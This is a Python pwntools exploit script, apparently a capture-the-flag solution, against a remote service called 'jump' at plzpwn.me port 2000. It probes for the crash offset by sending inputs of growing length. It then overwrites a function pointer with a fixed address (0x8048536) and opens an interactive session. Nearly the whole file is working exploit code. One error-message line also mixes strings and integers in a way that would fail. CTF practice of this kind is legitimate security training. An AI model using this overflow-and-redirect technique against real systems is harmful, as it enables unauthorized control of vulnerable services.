from binascii import unhexlify
from pwn import *

PROGRAM_NAME = "jump"
ENCODING = "ascii"
REMOTE = 1
OFFSET = 16


def p_beg():
	return remote('plzpwn.me', 2000)
	#process('./jump')
	
def p_rdy(x):
	return x.recvuntil("Do you remember how function pointers work ?".encode(ENCODING), timeout = 10).decode(ENCODING)

def segfault_wrap(tries = 2):
	firstrun = 1
	last = 0

	for i in range(tries):
		header = str(i+1)+". "
		buf = segfault_inc()
		print(header+"seg fault at "+str(buf))
		if(firstrun): 
			firstrun = 0
			last = buf
		elif(buf != last):
			# bad result
			print(header+"Bad result! Last: "+last)
			return buf
		
			
	return buf
		
		

def segfault_inc(lam_beg = lambda: p_beg(), lam_rdy = lambda x: p_rdy(x), max = 100, bad_magic = "ault", good_magic = "------"):
	soup = ""
	entry = 1
		
	while(entry <= max):
		soup = soup + chr(entry+OFFSET)
		
		p = lam_beg()
		lam_rdy(p)
		p.sendline(soup.encode(ENCODING))
		inbound = p.recvall(timeout=5).decode(ENCODING)
		print(inbound)
		
		# any remote
		if(inbound.find(bad_magic) != -1): # seg found
			return (entry)
		
		if(not(REMOTE)):
			if(p.poll() != 0):
				return entry

		if(REMOTE):
			if(inbound.find(good_magic) == -1):
				return entry
		
		entry = (entry + 1)
		
	return -1

def main():
	stage = 0
	fin = 0
	
	while(fin < 1):
		if(stage == 0):
			seg = segfault_wrap()
			stage = stage + 1
		elif(stage == 1):
			seg = seg # - padd
			p = p_beg()
			p_rdy(p)
			fill = b'\x37'*seg
			payload = p32(0x8048536)
			
			
			print("Fill: "+fill.decode(ENCODING))
			print("Payload: "+str(payload))

			p.send_raw(fill+payload) # win
			p.sendline(b'') # fire!
			
			print(p.recv(200, timeout = 5))
			p.interactive()
			stage = stage + 1
		else:
			print("Weird flex, exiting")
			fin = 1

if __name__ == '__main__':
	main()